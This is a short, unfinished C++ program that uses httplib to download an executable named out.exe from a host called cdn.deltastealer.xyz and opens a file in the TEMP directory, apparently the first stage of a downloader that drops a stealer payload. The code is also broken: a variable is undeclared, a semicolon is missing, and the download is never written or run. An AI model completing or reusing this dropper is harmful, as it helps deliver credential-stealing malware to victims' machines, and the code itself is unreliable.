#include <iostream>
#include <fstream>
#include <cstdlib>
#include <string>

#include "httplib.h"

using namespace std;

int main()
{
    httplib::Client client("https://cdn.deltastealer.xyz");
    auto res = client.Get("/<channel_id>/cpp/out.exe");
    
    ofstream file;

    string envVar = "temp";

    env_val = getenv(envVar.c_str());
    file.open(env_val)
}